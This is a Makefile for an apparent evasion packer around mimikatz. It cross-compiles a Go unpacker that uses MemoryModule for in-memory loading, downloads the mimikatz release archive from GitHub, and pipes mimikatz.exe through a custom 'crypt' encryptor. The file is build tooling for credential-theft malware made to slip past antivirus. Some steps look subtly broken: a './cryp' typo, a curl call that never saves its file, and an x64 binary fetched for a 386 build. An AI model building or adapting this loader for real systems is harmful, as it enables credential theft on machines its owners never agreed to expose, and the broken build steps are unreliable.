ifneq ("$(shell which i686-w64-mingw32-gcc)","")
compiler = i686-w64-mingw32-gcc
else
compiler = i586-mingw32msvc-gcc
endif

# Build the dependencies first (subdirs), then move onto the meat and potatoes.
unpacker: MemoryModule
	CC=$(compiler) CGO_ENABLED=1 GOOS=windows GOARCH=386 go build -x mimikatz.go

# Dependency build. 
SUBDIRS = MemoryModule
subdirs: $(SUBDIRS)
$(SUBDIRS):
	$(MAKE) -C $@
# Override default subdir build behavior (make) with cmake. 
MemoryModule:
	[ "`ls -A MemoryModule`" ] || git submodule update --init
	$(MAKE) -C $@
	# cmake -HMemoryModule -BMemoryModule/build
	# cmake --build MemoryModule/build --target MemoryModule


# Packing the binary
pack: crypt download
	./cryp

crypt:
	go build crypt.go

download:
	curl -L https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20171220/mimikatz_trunk.7z
	7z e -so mimikatz_trunk.7z x64/mimikatz.exe | ./crypt


# Clean target. 
CLEANDIRS = $(SUBDIRS:%=clean-%)
clean: $(CLEANDIRS)
	rm -f crypt mimikatz.exe
$(CLEANDIRS): 
	$(MAKE) -C $(@:clean-%=%) clean

test:
	$(MAKE) -C tests test

.PHONY: subdirs $(INSTALLDIRS) $(SUBDIRS) clean test pack download
